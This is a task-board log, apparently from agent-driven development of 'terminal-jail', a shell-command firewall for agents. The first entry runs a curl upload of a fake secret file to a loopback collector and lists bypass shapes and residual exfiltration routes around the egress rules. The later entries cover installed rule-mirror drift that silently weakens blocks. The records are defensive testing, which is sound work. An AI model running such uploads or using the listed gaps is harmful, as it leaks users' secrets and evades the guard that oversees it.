 {"status": "complete", "id": "DF-TERMINAL-JAIL-20", "title": "[dogfood:P1] The egress pack's MODIFY verdicts do not prevent exfiltration — a real collector received the uploaded secret file (only a BLOCK would)", "detail": "Measured with a real local collector at HEAD 5275a86: bridge verdict for `curl -s -T /tmp/dogfood-tj/secret.txt http://127.0.0.1:18777/collect` -> {\"action\":\"modify\",\"rule_id\":\"builtin-net-curl-upload\"}; the CLI ran the rewritten command `unshare --user --pid --fork --kill-child=SIGKILL bash -c 'curl -s -T …/secret.txt http://127.0.0.1:18777/collect'`, exit 0, and the collector received 132 bytes containing the secret content (FAKE_PRIVATE_KEY_MATERIAL). So builtin-net-curl-upload (and the whole BUILTIN_SANDBOX egress group added by TJ-GAP-058) contains the process; it does not stop the data leaving. The commit message describes the group as covering 'sandbox exfil', and a reader of the README's rule table reasonably reads auto-sandbox as a mitigation — it is not: on the mapping-less (legacy) branch the sandboxed curl reads the caller's file fine and the upload completes; on a mapped branch the upload fails only because the payload cannot read the caller's files at all (DF-15), not because of any security decision. Net effect: an agent or user who is exfiltrating still succeeds whenever the rule is the only thing in the way.", "priority": "P1", "source": "dogfood", "reasoning": {"note": "dogfood run 2026-09-18 — end-to-end measurement through the documented CLI + bridge with a real HTTP collector"}, "review_notes": "Fix direction: decide the intent per rule — if the egress rules are meant to stop exfiltration they must BLOCK (or block-until-approved), not auto-sandbox; if they are meant to contain, then say so plainly in README/specs and stop describing the group as exfil protection. Add an end-to-end regression that runs a local collector and asserts the payload does not arrive for a rule claimed to prevent exfil. Evidence: docs/dogfood/2026-09-18-integration.md §2.4. || TICK 292 VERDICT FOLD: GitReins Tier 2 verdict e158abfa (.gitreins/history/2026-09-19/d22db7f8/verdict.json) PASS — tier1 PASS + tier2 COMPLETE, all criteria PASS, passed: true, evaluated on commit 9f755906 (the board-close commit; the graded work commit is 3162a25 — the judge evaluates HEAD at run time). The judge independently re-derived the RED proof (same file -> 4 failed / 2 passed on the pre-fix engine) and independently re-ran the no-delivery E2E (rc=126, collector requests=[], secret delivered: False), the 13 pinned ALLOW controls and 15 upload shapes (failures: 0), the mirror parity probe (ALL PROBES PASS 54/54) and the full suite (821 passed / 5 skipped). || TICK 292 RESTORE (foreman error, disclosed): the board fold commit 4d9952c carried the PRE-FIX bytes of blocklist.py / sandbox.py / 00-builtins.yaml because the Tier-2 judge's RED-proof step had left the worktree holding its temporary revert (its own git-diff check reported clean; the files were not), and the following `git add <three board files>` swept them into the commit. CI run 35419819266 went RED on the reverted tree (the DF-20 tests fail by design against pre-fix code). Fixed forward, not amended: commit 441fec3 restores all three files from the graded work commit 3162a25 (sha256 of blocklist.py identical to 3162a25's; engine probe re-verified block x4 + allow control; parity ALL PROBES PASS; suite 821/5; gitreins guard --full Tier 1 PASS), and CI run 35419873385 on 441fec3 is GREEN. The lesson is recorded in skills/coding-hermes/terminal-jail-foreman-ops (judge leaves source files dirty; prove the tree by hash before any board commit).", "ts": "2026-09-18T22:10:40.542868+00:00", "worker_status": "complete", "dispatched_at": "2026-09-19T03:29:00+00:00", "completed_at": "2026-09-19T03:44:00+00:00", "attempts": 1, "exit_code": 0, "commit_hash": "3162a25", "files_changed": ["CHANGELOG.md", "README.md", "docs/dogfood/diagnostics.md", "docs/quickstart.md", "plugin/terminal_jail/interruptor/blocklist.py", "plugin/terminal_jail/interruptor/sandbox.py", "plugin/terminal_jail/rules/00-builtins.yaml", "plugin/test_egress_no_delivery.py", "plugin/test_escape_waves.py", "plugin/test_interruptor.py", "scripts/yaml-mirror-parity-probe.py", "skills/terminal-jail-usage/SKILL.md", "specs/interruptor.md"], "lines_added": 1377, "lines_removed": 245, "guard_result": "PASS", "ci_result": "SKIP", "worker_summary": "One worker dispatch, glm-5.3-flash @ zai-glm-default, ~14 min, exit 0, one content commit 3162a25 (+1377/-245, 13 files). The four file-upload egress rules moved from the auto-sandbox layer to the BLOCK layer (builtin-net-curl-upload, -curl-form-upload, -wget-post-file, -remote-tree-copy); blocklist rules are settled by the whole-command pass, so no rewrite and no always-allow short-circuit can approve them. Match-set additions close real bypasses: clustered short flags (-sT, -sd @file, -sF), attached operand -T<path>, =-joined long forms, --data-urlencode name@file, '//' as a whole-tree source, and a quote-aware gap that spans a quoted '&' while still stopping at an unquoted operator. YAML mirror re-baselined to 35 block / 9 sandbox / 10 allow = 54. New end-to-end file plugin/test_egress_no_delivery.py runs the real CLI against a loopback collector: uploads exit 126 with zero requests received; positive controls (plain download, inline-body POST) still execute and still deliver.", "foreman_note": "Tick #292. Foreman-independent verification of 3162a25 (each check run by the foreman, not transcribed from the worker report): (a) suite .venv/bin/python -m pytest -q -p no:cacheprovider -> 821 passed / 5 skipped (pre-tick baseline 732/5); (b) .venv/bin/ruff check . -> All checks passed; (c) scripts/yaml-mirror-parity-probe.py -> ALL PROBES PASS, block=35/35 sandbox=9/9 allow=10/10 total=54/54 with the new per-rule ACTION check; (d) gitreins guard --full -> Tier 1 PASS 4/4 (secrets/lint/tests full/static_analysis); (e) independent live probe (temp script, host rule dirs neutralised) 13/14 vectors exactly as briefed + 4/4 end-to-end CLI cases: curl -T and wget --post-file exit 126 with the collector receiving ZERO requests, plain download and inline-body POST still deliver; (f) independent RED proof: git archive c454ccf + the new E2E test -> 4 failed / 2 passed (failed by assertion on 'modify'), the 2 positive controls pass on both revisions by design; (g) the secret-pipe shape 'cat <secret> | curl -T - <url>' now blocks via builtin-net-curl-upload (df17df16's -file-exfil-pipe no longer claims it) - desired behaviour, noted for rule-attribution stability. LIVE HOST MIRROR NOT REFRESHED BY DESIGN: this box's ~/.config/terminal-jail/rules.d/00-builtins.yaml (mtime Sep 18 21:40, pre-DF-20) still carries the four ids at action: sandbox, and a same-id user rule REPLACES the builtin layer, so the live CLI here still rewrites-and-runs (measured: 'host-verdict modify builtin-net-curl-upload'). The fix takes effect only after ./install.sh refreshes that mirror; the upgrade note is in README 1c, specs/interruptor.md 4.5 and CHANGELOG. RESIDUAL, named and NOT claimed contained: helper-script-assembled payloads, curl -K/--config indirection, inline bodies, ssh/git-push data-out, interpreter APIs outside the named primitives, and the fact that nothing here is verified against a real network egress policy (loopback collector on this host only). resolved_without_code: no.", "blocked_reason": null, "updated_at": "2026-09-18 23:25:00.000000"}
 {"status": "complete", "id": "TJ-GAP-068", "title": "[P3] AGENTS.md documents a guard invocation that falsely FAILs the tests lane (gitreins venv pytest shadows the repo interpreter)", "detail": null, "priority": "P3", "source": null, "reasoning": "Tick #289: running the documented command verbatim (PATH=$HOME/go/bin:$HOME/gitreins-poc/.venv/bin:$PATH gitreins guard) put Python 3.10 pytest first on PATH, so the suite died at collection on import tomllib (3.11+) and the guard reported tests FAIL on a clean tree (guard log guard-20260919T005837: 1 error in 0.25s). The lane no longer depends on PATH because .gitreins/config.yaml now pins test_command to .venv/bin/python -m pytest (chore 9b06e75), but the doc line still teaches an order that breaks any other tool resolved from PATH. FIX (blocked for this tick: AGENTS.md is a protected agent-instruction file and no interactive approver was present): change AGENTS.md line 31 to PATH=\"$HOME/go/bin:<repo>/.venv/bin:$HOME/gitreins-poc/.venv/bin:$PATH\" gitreins guard plus a one-line why (the poc venv is Python 3.10 and ships its own pytest). PASS: the documented command run verbatim from a clean checkout reports Tier 1 PASS 4/4.", "review_notes": null, "ts": null, "complexity": 1, "created_at": "2026-09-19T01:26:50.966926+00:00", "updated_at": "2026-09-19T01:26:50.966926+00:00", "commit_hash": "f7019f627192e8077eda4208865a0e50551e9ce2", "judge_verdict": "PASS", "judge_run": "9cd3ec18", "worker_summary": "AGENTS.md guard invocation fixed (gitreins venv pytest shadowed repo interpreter); judge PASS complete (runs 9cd3ec18, fcb0ae1b) on merge commit f7019f6", "completed_at": "2026-09-20T18:43:07Z"}
 {"status": "complete", "priority": "P2", "complexity": 2, "depends_on": null, "blocks": null, "primary_model": "glm-5.3-flash", "primary_provider": "zai-glm-default", "fallback_model": null, "fallback_provider": null, "reasoning": "Tick #292: closing DF-TERMINAL-JAIL-20 made the four upload rules BLOCK in the engine, but the installed mirror on the machine under test still carries them at action: sandbox (mtime Sep 18 21:40, i.e. the DF-17 revision), and a same-id user rule REPLACES the builtin entry in its layer. So the live firewall silently keeps the weaker behaviour the fix removed, and nothing in the repo or on the host reports the divergence. The same-id-override mechanism already produced a silent-shadowing incident (specs/interruptor.md, DF-20 host note), which is why the precedence contract exists at all — but precedence is documented, NOT monitored. Patch the mechanism, not the symptom: the detecting primitive (scripts/yaml-mirror-parity-probe.py, engine-vs-YAML parity) already exists in-repo; what is missing is a LIVE check that folds the host's resolved rule dirs into the comparison.", "capability_tags": ["security", "cli", "tests", "docs"], "worker_status": "done", "dispatched_at": null, "completed_at": "2026-09-20 10:08:47.000000", "attempts": "1", "exit_code": "0", "commit_hash": "540e73e885cfd89bfd3c9544d9d26ffb14e613d7", "files_changed": null, "lines_added": 0, "lines_removed": 0, "guard_result": "PASS (1102 passed 7 skipped, ruff clean, mirror parity ALL PROBES PASS)", "ci_result": null, "worker_summary": null, "foreman_note": "Tick #301 wave. Judge PASS. Foreman independently verified with an own downgrade fixture: bare run rc=0 printing DRIFT rows (id, engine action=block, installed action=sandbox, both paths); --fail-on-drift rc=1. Live host run reports OK/0 drift because the host mirror was refreshed 2026-09-18 23:21 (post-filing) and now parses 54 rules with 0 action differences — the probe is correct, the original drift no longer exists.", "blocked_reason": null, "review_notes": null, "created_at": "2026-09-18 23:10:00.000000", "updated_at": "2026-09-20 10:08:51", "blocked_since": null, "id": "TJ-GAP-069", "title": "[P2] Installed rule-mirror drift is silent: a same-id user copy with a weaker action keeps overriding the engine after a fix, and nothing reports it", "detail": "LIVE EVIDENCE (tick #292, host kara-lair): the engine + shipped mirror at HEAD 3162a25 are in parity at 35 block / 9 sandbox / 10 allow = 54 with the four upload rule ids at action: block; the DEFAULT resolution on this host reports the opposite — `intercept('curl -T <secret> <collector>')` with the host's own rules dirs (no env override) returns action=modify / rule_id=builtin-net-curl-upload, because ~/.config/terminal-jail/rules.d/00-builtins.yaml (mtime Sep 18 21:40, pre-DF-20, 13 `action: sandbox` entries) supplies a same-id user rule that REPLACES the engine builtin. No test, probe, doctor command or docs step reports this: the suite is host-independent by design (it pins the rule dirs to the shipped mirror, DF-20 commit message), so the divergence is invisible exactly where it matters most — on an installed host. The failing property is the ACTION (block vs sandbox/modify), which is the difference between 'the command is refused' and 'the command runs'. ACCEPTANCE CRITERIA: (1) a script (suggested: scripts/rules-drift-probe.py, on the pidns-capability-probe / fs-isolation-probe / systemd-directive-probe pattern: classify the host, ALWAYS exit 0, and print the drift rows) that loads the host's RESOLVED rule dirs (TERMINAL_JAIL_INTERRUPTOR_RULES_DIR + TERMINAL_JAIL_INTERRUPTOR_USER_RULES_DIR, then the documented defaults) and compares every builtin rule id present there against the engine constant: report DRIFT naming the id, engine action, host action, and both file paths — and report OK when the dirs are empty/absent, clearly labelled 'no installed override'; (2) the probe must be able to return NON-zero for CI/gate use (a --fail-on-drift flag), while the bare form stays a classifier; (3) an expected-output fixture or unit test that runs the probe against a temporary rules dir containing a deliberately downgraded copy (action: sandbox for a block id) and asserts the drift row, plus a clean-dir case asserting OK; (4) the install/upgrade docs (README upgrade note, docs/quickstart.md verify flow, specs/cli.md) call the probe after install.sh so a host that upgrades the repo but not the mirror learns it in one command; (5) suite + ruff + yaml-mirror parity green. DO NOT fix this by weakening the same-id override contract (it is a documented feature and a pinned incident) and do not make the default install silently ignore ~/.config/terminal-jail/rules.d.", "source": "tick-292-foreman", "ts": "2026-09-18T23:10:00+00:00", "worktree": "/home/kara/worktrees/terminal-jail-TJ-GAP-069", "branch": "wt/TJ-GAP-069"}
-{"status": "pending", "id": "QA-TERMINAL-JAIL-9", "title": "[P1] Battery shipped a DIRTY sibling worktree — fresh-install installed pytest into a venv the repo's own flow never uses, so native/chaos cells never measured the repo at HEAD", "priority": "P1", "cell": "fresh-install + ci-pass + chaos-resource + chaos-disconnect", "detail": "At launch (HEAD e3c59d6, uncommitted) git status showed 6 modified files (plugin/test_interruptor.py, interruptor/blocklist.py, interruptor/sandbox.py, rules/00-builtins.yaml, .gitreins/tasks.yaml, plugin/test_escape_waves.py) plus untracked dagger.db. The battery's tar synced that LIVE tree, so the JIT agent audited in-flight work, not the pushed HEAD. Consequences: (a) fresh-install reported OK (pip installed pytest into a bootstrap venv) but the repo's own dev flow is 'uv sync --dev' (README:530), so the installed layout diverges from what users get; (b) ci-pass native leg rc=1 and chaos-resource rc=1 both reduce to pytest not on PATH in the battery's venv — the suite was never invoked, so those cells carry no repo signal; (c) chaos-disconnect's 'OK (fails fast rc=127)' is a FALSE-OK — rc=127 means the runner was absent, so no disconnect behaviour was exercised. Attribution per qa-foreman-interpretation: the sync tars a LIVE workdir non-atomically, so a workdir mid-edit yields cells that cannot distinguish runner from repo. Fix belongs to the harness (freeze/checkout HEAD before sync, or sync a git-archive of HEAD), not to the project.", "reasoning": "QA foreman cycle 2026-09-19 — fresh-system CI pass + chaos on bunker-las-02 (fresh-install + ci-pass + chaos cells)", "created_at": "2026-09-19T03:59:41.906493+00:00", "source": "terminal-jail-qa lane 2026-09-19-03-31-04", "attempts": 0}
